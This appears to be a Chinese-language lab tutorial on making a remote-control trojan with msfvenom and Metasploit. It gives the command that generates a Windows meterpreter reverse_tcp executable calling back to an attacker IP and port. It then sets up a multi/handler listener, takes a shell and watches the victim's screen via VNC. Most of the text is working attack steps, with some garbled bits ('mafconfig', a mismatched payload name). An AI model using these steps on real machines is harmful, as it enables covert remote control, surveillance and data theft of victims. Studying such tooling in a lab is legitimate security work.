msfvenom制作远控木马

远控木马：控制（键盘、鼠标、摄像头）

一、msfvenom介绍

msfvenom是msfpayload,msfencode的结合体。使用msfvenom制作木马的思路是，木马在目标机上执行后，向本机发送信息，而本机则需要开启监听状态，收到信息后则进行连接。

二、msfvenom编写Trojan木马

cd Desktop

ip addr（ifconfig） 找eth0（net桥接以太网）的ip

打开终端并输入以下命令：msfvenom -p [payload] LHOST=[IP地址] LPORT=[端口号] -f [格式] -o [文件名]

将[payload]替换为你想要使用的载荷类型，例如windows/x64/meterpreter/reverse_tcp。

将[IP地址]替换为你的IP地址。

将[端口号]替换为你想要使用的端口号。

将[格式]替换为你想要使用的文件格式。

将[文件名]替换为你想要使用的文件名。

例如，如果你想生成一个反向连接的Windows，可以使用以下命令：

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.88.130 lport=9999

-f exe -o 9999.exe

得到生成的名为9999.exe的木马程序。

把生成的windows.exe木马文件拖放到windows靶机上，运行。

我们在kali运行mafconfig，后运行

三、msfconsole控制感染对象

在kali 中需要在msfconsole设置一些参数，然后开启监听，这样木马运行后便能够获得shell：

在Kali终端使用msfconsole控制感染对象(一颗大心脏)

加载exploit/multi/handler模块（msf5 > use exploit/multi/handler)

设置载荷与制作程序时输入的-p参数一致windows/meterpreter_reverse_tcp

最后再设置LHOST和LPORT与程序的参数一致
指向Kali系统IP

配置完毕，run运行监听

电脑端示例：shell获取Windows的CMD

进入meterpreter后便已经获得了目标机shell，输入help查看更多命令。

输入run vnc命令可以实时查看目标机的屏幕。

handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.88.130 -P 9999（鱼钩丢河里)

sessions 1 ？（大量的命令和描述信息）//提示
